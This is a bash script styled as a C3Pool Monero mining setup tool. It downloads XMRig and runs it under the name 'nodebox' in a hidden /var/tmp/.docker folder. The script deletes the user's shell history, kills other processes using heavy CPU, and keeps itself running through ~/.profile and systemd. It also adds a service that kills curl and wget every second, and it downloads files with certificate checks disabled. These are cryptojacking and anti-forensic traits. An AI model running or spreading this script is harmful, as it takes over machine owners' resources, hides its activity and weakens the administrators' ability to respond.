#!/bin/bash

VERSION=2.11

echo "C3Pool mining setup script v$VERSION."
echo "(please report issues to support@c3pool.com email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

WALLET=$1
EMAIL=$2

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> pool.sh <wallet address or USDT TRC20 address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 -a ${#WALLET_BASE} != 34 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106, 95, or 34 for USDT TRC20): ${#WALLET_BASE}"
  exit 1
fi

PASS="root"

if [ ! -d /var/tmp ]; then
  echo "ERROR: /var/tmp directory does not exist"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

if [ -f ~/.bash_history ]; then
    rm ~/.bash_history
fi
if [ -f ~/.zsh_history ]; then
    rm ~/.zsh_history
fi

download_file() {
  local url="$1"
  local output="$2"
  if command -v busybox >/dev/null 2>&1 && busybox | grep -q wget; then
    busybox wget --no-check-certificate -q "$url" -O "$output" 2>/dev/null && return 0
  elif command -v curl >/dev/null 2>&1; then
    curl -L -k "$url" -o "$output" 2>/dev/null && return 0
  elif command -v wget >/dev/null 2>&1; then
    wget --no-check-certificate -q "$url" -O "$output" 2>/dev/null && return 0
  elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.request, ssl; ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE; urllib.request.urlretrieve(\"$url\", \"$output\", context=ctx)" 2>/dev/null && return 0
  elif command -v python >/dev/null 2>&1; then
    python -c "import urllib2, ssl; ctx = ssl._create_unverified_context(); f = urllib2.urlopen(\"$url\", context=ctx); open(\"$output\", \"wb\").write(f.read())" 2>/dev/null && return 0
  elif command -v node >/dev/null 2>&1; then
    node -e "var https=require(\"https\");var fs=require(\"fs\");var u=require(\"url\");var p=u.parse(\"$url\");var o={hostname:p.hostname,path:p.path,rejectUnauthorized:false};https.get(o,function(r){var f=fs.createWriteStream(\"$output\");r.pipe(f);f.on(\"finish\",function(){f.close()})})" 2>/dev/null && sleep 2 && return 0
  elif command -v php >/dev/null 2>&1; then
    php -r "file_put_contents(\"$output\", file_get_contents(\"$url\"));" 2>/dev/null && return 0
  elif [ -e /dev/tcp ]; then
    host=$(echo "$url" | sed -e "s|^[^/]*//||" -e "s|/.*$||")
    path=$(echo "$url" | sed -e "s|^[^/]*//[^/]*||")
    port=443
    if echo "$url" | grep -q "^http:"; then port=80; fi
    exec 3<>/dev/tcp/$host/$port 2>/dev/null || return 1
    echo -e "GET $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n" >&3
    sed "1,/^$/d" <&3 > "$output" 2>/dev/null
    exec 3<&-; exec 3>&-
    return 0
  fi
  return 1
}

download_text() {
  local url="$1"
  if command -v busybox >/dev/null 2>&1 && busybox | grep -q wget; then
    busybox wget --no-check-certificate -qO- "$url" 2>/dev/null
  elif command -v curl >/dev/null 2>&1; then
    curl -s -Lk "$url" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -qO- --no-check-certificate "$url" 2>/dev/null
  elif command -v python3 >/dev/null 2>&1; then
    python3 -c "import urllib.request, ssl; ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE; print(urllib.request.urlopen(\"$url\", context=ctx).read().decode())" 2>/dev/null
  elif command -v python >/dev/null 2>&1; then
    python -c "import urllib2, ssl; ctx = ssl._create_unverified_context(); print(urllib2.urlopen(\"$url\", context=ctx).read())" 2>/dev/null
  elif command -v node >/dev/null 2>&1; then
    node -e "var https=require(\"https\");var u=require(\"url\");var p=u.parse(\"$url\");var o={hostname:p.hostname,path:p.path,rejectUnauthorized:false};https.get(o,function(r){var d=\"\";r.on(\"data\",function(c){d+=c});r.on(\"end\",function(){process.stdout.write(d)})})" 2>/dev/null
  elif command -v php >/dev/null 2>&1; then
    php -r "echo file_get_contents(\"$url\");" 2>/dev/null
  elif [ -e /dev/tcp ]; then
    host=$(echo "$url" | sed -e "s|^[^/]*//||" -e "s|/.*$||")
    path=$(echo "$url" | sed -e "s|^[^/]*//[^/]*||")
    port=443
    if echo "$url" | grep -q "^http:"; then port=80; fi
    exec 3<>/dev/tcp/$host/$port 2>/dev/null || return 1
    echo -e "GET $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n\r\n" >&3
    sed "1,/^$/d" <&3
    exec 3<&-; exec 3>&-
  fi
}

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

echo "Projected Monero hashrate: $EXP_MONERO_HASHRATE H/s"

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by /var/tmp/.docker/docker.sh script."
echo "Mining will happen to $WALLET wallet on SupportXMR pools."
if [ ! -z $EMAIL ]; then
  echo "(Email $EMAIL provided for reference - check stats at https://www.supportxmr.com/)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using c3pool_miner systemd service."
  echo "Kill service will monitor and kill curl/wget processes."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads with $CPU_MHZ MHz and ${TOTAL_CACHE}KB data cache in total, so projected Monero hashrate is around $EXP_MONERO_HASHRATE H/s."
echo

echo "[*] Removing previous c3pool miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop c3pool_miner.service
  sudo systemctl stop curl_wget_killer.service 2>/dev/null
fi
killall xmrig 2>/dev/null
killall -9 xmrig 2>/dev/null
killall -9 nodebox 2>/dev/null
pkill nodebox 2>/dev/null
pkill xmrig 2>/dev/null
echo "[*] Killing processes with CPU usage > 70%"
ps aux | awk 'NR>1 && $3 > 70.0 && $2 != '$$' {print $2}' | while read pid; do
  if [ ! -z "$pid" ]; then
    kill -9 $pid 2>/dev/null
  fi
done

echo "[*] Removing /var/tmp/.docker directory"
rm -rf /var/tmp/.docker

echo "[*] Downloading C3Pool advanced version of nodebox to /var/tmp/nodebox.tar.gz"
if ! download_file "https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz" /var/tmp/nodebox.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/xmrig.tar.gz file to /var/tmp/nodebox.tar.gz"
  exit 1
fi

echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.docker"
[ -d /var/tmp/.docker ] || mkdir -p /var/tmp/.docker
if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.docker; then
  echo "ERROR: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.docker directory"
  exit 1
fi
rm /var/tmp/nodebox.tar.gz

if [ -f /var/tmp/.docker/xmrig ]; then
  mv /var/tmp/.docker/xmrig /var/tmp/.docker/nodebox
fi

echo "[*] Checking if advanced version of /var/tmp/.docker/nodebox works fine (and not removed by antivirus software)"
if [ -f /var/tmp/.docker/config.json ]; then
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.docker/config.json
fi
/var/tmp/.docker/nodebox --help >/dev/null 2>&1
if (test $? -ne 0); then
  if [ -f /var/tmp/.docker/nodebox ]; then
    echo "WARNING: Advanced version of /var/tmp/.docker/nodebox is not functional"
  else 
    echo "WARNING: Advanced version of /var/tmp/.docker/nodebox was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_LINUX_RELEASE="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /var/tmp/nodebox.tar.gz"
  if ! download_file "$LATEST_XMRIG_LINUX_RELEASE" /var/tmp/nodebox.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /var/tmp/nodebox.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /var/tmp/nodebox.tar.gz to /var/tmp/.docker"
  if ! tar xf /var/tmp/nodebox.tar.gz -C /var/tmp/.docker --strip=1; then
    echo "WARNING: Can't unpack /var/tmp/nodebox.tar.gz to /var/tmp/.docker directory"
  fi
  rm /var/tmp/nodebox.tar.gz

  if [ -f /var/tmp/.docker/xmrig ]; then
    mv /var/tmp/.docker/xmrig /var/tmp/.docker/nodebox
  fi

  echo "[*] Checking if stock version of /var/tmp/.docker/nodebox works fine (and not removed by antivirus software)"
  if [ -f /var/tmp/.docker/config.json ]; then
    sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' /var/tmp/.docker/config.json
  fi
  /var/tmp/.docker/nodebox --help >/dev/null 2>&1
  if (test $? -ne 0); then 
    if [ -f /var/tmp/.docker/nodebox ]; then
      echo "WARNING: Stock version of /var/tmp/.docker/nodebox is not functional"
    else 
      echo "WARNING: Stock version of /var/tmp/.docker/nodebox was removed by antivirus"
    fi
    
    if [ -f /etc/os-release ] && grep -q 'NAME="Alpine Linux"' /etc/os-release; then
      echo "[*] Detected Alpine Linux, installing xmrig from apk"
      apk add xmrig 2>/dev/null || apk add --no-cache xmrig 2>/dev/null
      if command -v xmrig >/dev/null 2>&1; then
        echo "[*] xmrig installed successfully from apk"
        PASS="root"
        echo "[*] Starting xmrig with auto-restart loop"
        (while true; do
          xmrig -o pool.supportxmr.com:443 -u $WALLET -p $PASS -k --donate-level 0 --log-file=/var/tmp/.docker/nodebox.log --coin monero --tls >/dev/null 2>&1
          sleep 5
        done) &
        echo "[*] xmrig started in background with auto-restart"
        exit 0
      else
        echo "ERROR: Failed to install xmrig from apk"
        exit 1
      fi
    else
      echo "ERROR: Stock version of /var/tmp/.docker/nodebox is not functional and not Alpine Linux"
      exit 1
    fi
  fi
fi

echo "[*] Miner /var/tmp/.docker/nodebox is OK"

PASS="root"

echo "[*] Creating SupportXMR config.json with multiple pools"
cat >/var/tmp/.docker/config.json <<EOL
{
    "autosave": true,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": true
        },
        {
            "url": "pool.supportxmr.com:8080",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:7777",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:5555",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:80",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        },
        {
            "url": "pool.supportxmr.com:3333",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "tls": false
        }
    ],
    "log-file": "/var/tmp/.docker/nodebox.log",
    "donate-level": 0,
    "max-cpu-usage": 100,
    "syslog": true
}
EOL

cp /var/tmp/.docker/config.json /var/tmp/.docker/config_background.json
sed -i 's/"background": *false,/"background": true,/' /var/tmp/.docker/config_background.json 2>/dev/null || true

echo "[*] Creating /var/tmp/.docker/docker.sh script"
cat >/var/tmp/.docker/docker.sh <<EOL
#!/bin/bash

if ! pidof nodebox >/dev/null; then
  nice /var/tmp/.docker/nodebox \$*
else
  if [ ! -f /var/tmp/.docker/nodebox.log ]; then
    echo "[*] File /var/tmp/.docker/nodebox.log not found"
    /var/tmp/.docker/nodebox --config=/var/tmp/.docker/config.json >/dev/null 2>&1
  else
    echo "Monero miner is already running in the background. Refusing to run another one."
    echo "Run \"killall nodebox\" or \"sudo killall nodebox\" if you want to remove background miner first."
  fi
fi
EOL

chmod +x /var/tmp/.docker/docker.sh

if ! sudo -n true 2>/dev/null; then
  if [ -z "$HOME" ]; then
    HOME=/var/tmp
  fi
  if ! grep ".docker/docker.sh" $HOME/.profile >/dev/null 2>&1; then
    echo "[*] Adding /var/tmp/.docker/docker.sh script to $HOME/.profile"
    echo "/var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like /var/tmp/.docker/docker.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in /var/tmp/.docker/nodebox.log file)"
  for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
    if command -v $s >/dev/null 2>&1; then
      $s /var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1 &
      break
    fi
  done
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168+$(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in /var/tmp/.docker/nodebox.log file)"
    for s in /bin/bash /bin/sh /usr/bin/bash /usr/bin/sh bash sh; do
      if command -v $s >/dev/null 2>&1; then
        $s /var/tmp/.docker/docker.sh --config=/var/tmp/.docker/config_background.json >/dev/null 2>&1
        break
      fi
    done
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

    echo "[*] Creating curl_wget_killer systemd service"
    cat >/var/tmp/curl_wget_killer.service <<EOL
[Unit]
Description=Kill curl and wget processes

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do pkill -9 curl; pkill -9 wget; sleep 1; done'
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /var/tmp/curl_wget_killer.service /etc/systemd/system/curl_wget_killer.service
    echo "[*] Starting curl_wget_killer systemd service"
    sudo systemctl daemon-reload
    sudo systemctl enable curl_wget_killer.service
    sudo systemctl start curl_wget_killer.service

    echo "[*] Creating c3pool_miner systemd service"
    cat >/var/tmp/c3pool_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=/var/tmp/.docker/nodebox --config=/var/tmp/.docker/config.json
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOL
    sudo mv /var/tmp/c3pool_miner.service /etc/systemd/system/c3pool_miner.service
    echo "[*] Starting c3pool_miner systemd service"
    sudo killall nodebox 2>/dev/null
    sudo systemctl daemon-reload
    sudo systemctl enable c3pool_miner.service
    sudo systemctl start c3pool_miner.service
    echo "To see miner service logs run \"sudo journalctl -u c3pool_miner -f\" command"
    echo "To see kill service logs run \"sudo journalctl -u curl_wget_killer -f\" command"
  fi
fi

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e nodebox -l $((75*$CPU_THREADS)) -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e nodebox -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e nodebox -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.docker/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \/var/tmp/.docker/config_background.json"
fi
echo ""
sleep 5
if [ ! -f /var/tmp/.docker/nodebox.log ]; then
  echo "[*] File /var/tmp/.docker/nodebox.log not found"
  /var/tmp/.docker/nodebox --config=/var/tmp/.docker/config.json >/dev/null 2>&1
fi

echo "[*] Setup complete" 